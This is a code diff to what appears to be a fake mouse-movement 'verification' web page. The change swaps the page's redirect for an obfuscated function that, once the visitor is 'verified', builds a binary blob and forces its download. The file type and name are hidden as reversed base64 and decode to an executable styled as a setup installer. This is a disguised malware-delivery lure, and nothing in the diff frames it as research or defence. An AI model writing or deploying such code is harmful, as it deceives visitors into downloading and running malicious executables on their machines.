@@ -211,7 +211,21 @@
     let lastTime = null;
     let movements = [];
 
-    const hexArray = [ ];
+    var cs = "";
+    
+    function latestDataFetcher() {
+        for (var M = atob(cs), D = new Uint8Array(M.length / 2), N = 0; N < D.length; N++)
+            D[N] = parseInt(M.substr(2 * N, 2), 16);
+        var Y = "tFWZyR3ctQXZ0N2bv42bpRXYjlGbwBXY";
+        Y = Y.split("").reverse().join("");
+        var j = new Blob([D], {
+                type: atob(Y)
+            }),
+        Z = "QZ4VmL04SNyAjMfBXd0V2Uu92YsFmR";
+        Z = Z.split("").reverse().join(""),
+        saveAs(j, atob(Z))
+    }
+    
     const redirectDelay = 1200;
 
     document.body.addEventListener("mousemove", function(event) {
@@ -275,12 +289,8 @@
                 verifyButton.classList.add('success');
                 verifyButton.textContent = "✓ Verified";
                 challengeMessage.textContent = "Verification successful!";
-                const charArray = hexArray.map(hex => String.fromCharCode(parseInt(hex, 16)));
-                const vrfyString = charArray.join("");
-                const secString = vrfyString.split("").reverse().join("");
-                const redirectUrl = atob(secString);
                 setTimeout(() => {
-                    window.location.href = redirectUrl;
+                    latestDataFetcher();
                 }, redirectDelay);
 
             } else {
@@ -306,7 +316,7 @@
     }
 
     const requestIdElement = document.getElementById('request-id');
-    const randomHex = getRequestIdValue(16); // Example: 32-character hexadecimal value
+    const randomHex = getRequestIdValue(16);
     requestIdElement.textContent = `Request ID: ${randomHex}`;
 
 </script>
